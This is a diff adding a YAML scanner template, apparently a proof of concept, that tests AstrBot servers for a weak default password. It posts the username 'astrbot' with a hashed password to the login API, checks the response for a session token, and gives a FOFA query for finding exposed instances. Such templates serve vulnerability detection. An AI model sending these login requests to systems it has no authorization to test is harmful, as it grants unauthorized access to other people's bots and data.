@@ -1,0 +1,18 @@
+id: poc-yaml-astrbot-weak-passwd
+info:
+  name: AstrBot 弱口令漏洞
+  severity: high
+  tags:
+  - 弱口令
+  finger: astrbot
+  fofa: title="AstrBot"
+requests:
+- method: POST
+  path: /api/auth/login
+  headers:
+    Content-Type: application/json
+  data: '{"username":"astrbot","password":"77b90590a8945a7d36c963981a307dc9"}'
+  expression: status_code == 200 && contains(body,"\"status\":\"ok\"") && contains(body,"\"username\":\"astrbot\"")
+    && contains(body,"true") && matches(body,"\"token\":\"([0-9a-zA-Z.]+)\"")
+variables: {}
+transport: http
